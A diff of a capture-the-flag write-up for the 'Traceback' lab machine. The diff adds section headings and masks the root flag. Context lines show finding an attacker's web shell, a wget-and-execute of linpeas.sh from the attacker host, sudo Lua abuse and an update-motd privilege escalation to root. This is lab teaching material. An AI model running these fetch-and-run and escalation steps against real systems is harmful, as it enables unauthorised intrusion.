@@ -108,7 +108,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 <figure><img src="../../.gitbook/assets/5377_vmware_SCordmCU0Y.png" alt=""><figcaption></figcaption></figure>
 
-
+## Web Enumeration
 
 
 
@@ -156,6 +156,12 @@ by Ben "epi" Risher 🤓                 ver: 2.11.0
 
 
 
+## Initial Foothold
+
+### Searching for a web shell uploaded by the attacker
+
+
+
 <figure><img src="../../.gitbook/assets/imagen (477).png" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://github.com/TheBinitGhimire/Web-Shells" %}
@@ -167,7 +173,6 @@ by Ben "epi" Risher 🤓                 ver: 2.11.0
 
 
 ```bash
-
 ❯ cat webshells.txt
 Name 	Language 	Availability
 shell.php 	Find Here! 	PHP
@@ -250,7 +255,7 @@ Finished
 ===============================================================
 ```
 
-
+### Using SmEvK\_PathAn Shell to get a Reverse Shell
 
 admin/admin
 
@@ -311,6 +316,10 @@ webadmin@traceback:/var/www/html$ export SHELL=bash
 webadmin@traceback:/var/www/html$ stty rows 46 columns 230
 ```
 
+## Initial Access
+
+### Abusing sudoers privilege (Executing Lua Tool with another user)
+
 
 
 ```bash
@@ -357,7 +366,9 @@ sysadmin@traceback:/home/webadmin$ cat /home/sysadmin/user.txt
 3f001c3c927acba6c4473813ed726a65
 ```
 
+## Privilege Escalation
 
+### linPEAS Enumeration
 
 ```bash
 ❯ ls -l linpeas.sh
@@ -376,11 +387,14 @@ sysadmin@traceback:/tmp$ wget 10.10.14.2/linpeas.sh; chmod +x linpeas.sh; /tmp/l
 
 <figure><img src="../../.gitbook/assets/5384_vmware_ctvwSY4afh.png" alt=""><figcaption></figcaption></figure>
 
+### Pspy64 Monitorization
+
 
 
 ```bash
 ❯ ls -l pspy64
 .rwxr-xr-x kali kali 3.0 MB Tue Jan 17 22:09:52 2023  pspy64
+
 ❯ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
@@ -415,7 +429,7 @@ root      16749  0.0  0.0   4628   816 ?        Ss   09:31   0:00 /bin/sh -c sle
 root      16750  0.0  0.0   7468   740 ?        S    09:31   0:00 sleep 30
 ```
 
-
+### Update-Motd Privilege Escalation <a href="#exploit-title" id="exploit-title"></a>
 
 ```bash
 sysadmin@traceback:/etc/update-motd.d$ ls -l
@@ -538,7 +552,8 @@ Welcome to Xh4H land
 Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
 
 Last login: Thu Mar  6 09:38:03 2025 from 10.10.14.2
-$ 
+$ whoami
+sysadmin
 ```
 
 
@@ -560,5 +575,5 @@ Last login: Mon Apr 26 02:23:35 2021
 root@traceback:~# whoami
 root
 root@traceback:~# cat /root/root.txt 
-a4dba9c5a43ef713c2b013146209bd7e
+a4dba9**************************
 ```
